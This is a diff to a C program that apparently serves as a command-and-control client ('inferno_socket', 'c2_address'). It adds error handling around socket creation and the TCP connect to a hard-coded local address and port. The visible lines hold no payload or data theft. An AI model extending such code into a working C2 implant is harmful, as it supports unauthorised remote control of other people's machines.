@@ -2,12 +2,19 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <errno.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #define IP "127.0.0.1"
 #define PORT 33333
 #define PORT_HTTP 80
+
+//handle erros
+void error(char *message) {
+    fprintf(stderr, "%s: %s\n", message, strerror(errno));
+    exit(EXIT_FAILURE);
+}
 
 //print the banner
 void banner();
@@ -46,6 +53,8 @@ int main() {
     box_info();
     printf("Initializing socket...\n");
     int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (inferno_socket == -1)
+        error("Initializing socket failed");
 
     networking(inferno_socket);
 
@@ -120,7 +129,8 @@ void networking(int inferno_socket) {
     //connect
     box_info();
     printf("Connecting...\n");
-    int inferno_connect = connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
+    if (connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address)) == -1)
+         error("Error connecting");
     box_success();
     printf("Connected\n");
 }
